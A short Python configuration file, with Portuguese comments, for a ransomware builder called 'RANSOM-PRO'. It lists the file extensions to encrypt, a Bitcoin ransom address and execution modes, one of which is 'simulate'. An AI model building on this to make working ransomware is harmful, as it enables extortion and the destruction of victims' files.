# builder/config.py

# Extensões alvo padrão para criptografia
DEFAULT_EXTENSIONS = [
    ".txt", ".pdf", ".docx", ".xlsx", ".pptx", ".zip", ".rar",
    ".jpg", ".png", ".mp4", ".mp3", ".json", ".csv", ".xml",
    ".html", ".php", ".js", ".py", ".java", ".c", ".cpp"
]

# Nome do ransomware
RANSOMWARE_NAME = "RANSOM-PRO"

# Endereço BTC exemplo (pode ser alterado pelo builder)
BTC_ADDRESS = "bc1q4g636c8qlqpazkxc73zeudsn4e52mysycfmfwm"

# Modo de execução
DEFAULT_MODE = "standard"  # Pode ser "simulate", "lab", "dry-run"
